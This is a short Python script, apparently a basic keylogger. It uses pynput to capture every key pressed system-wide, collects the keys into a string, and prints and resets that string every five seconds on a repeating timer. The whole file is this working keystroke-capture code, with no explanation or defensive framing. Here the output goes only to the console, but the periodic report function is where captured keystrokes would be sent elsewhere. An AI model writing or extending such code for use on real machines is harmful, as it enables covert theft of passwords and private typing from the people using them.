import threading
import pynput.keyboard


key_list = []
key_string = ""

def process_key(key):
    global key_string
    try:
        key_string += str(key.char)
    except AttributeError:
        if key == key.space:
            key_string += " "
        else:
            key_string += ' ' + str(key) + ' '

def report():
    global key_string
    print(key_string)
    key_string = ''
    timer = threading.Timer(5, report)
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=process_key)
with keyboard_listener:
    report()
    keyboard_listener.join()